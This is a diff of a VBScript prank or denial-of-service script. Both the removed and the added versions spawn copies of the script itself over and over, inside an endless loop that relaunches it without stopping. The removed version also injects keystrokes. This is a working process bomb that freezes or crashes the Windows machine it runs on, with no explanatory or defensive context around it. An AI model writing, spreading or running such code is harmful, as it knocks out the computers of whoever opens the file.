@@ -1,35 +1,24 @@
-Set auto=CreateObject("wscript.shell")
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-do
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullName
-auto.Run WScript.ScriptFullNamea
-auto.sendkeys "AA{del}{del}"
-loop
+ Set auto=CreateObject("wscript.shell")
+ CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  do
+  CreateObject("WScript.Shell").Run WScript.ScriptFullName
+  loop
